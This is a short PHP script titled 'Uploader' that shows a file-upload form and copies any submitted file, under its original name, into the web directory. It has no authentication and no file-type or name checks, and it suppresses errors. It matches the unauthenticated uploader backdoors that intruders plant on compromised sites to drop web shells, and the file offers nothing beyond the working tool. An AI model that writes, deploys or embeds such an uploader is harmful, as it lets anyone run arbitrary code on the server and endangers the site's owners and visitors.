<?php
echo '<title>Uploader</title>';
echo '<center><font color="#11f0f3"><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>';
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></font><center>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<center><br><br><b><font color="#11f0f3">UPLOAD SUCCESS!</font></b></center><br><br>'; }
else { echo '<center><br><br><b><font color="#f31111">UPLOAD FAILED!</font></b></center><br><br>'; }
}
?>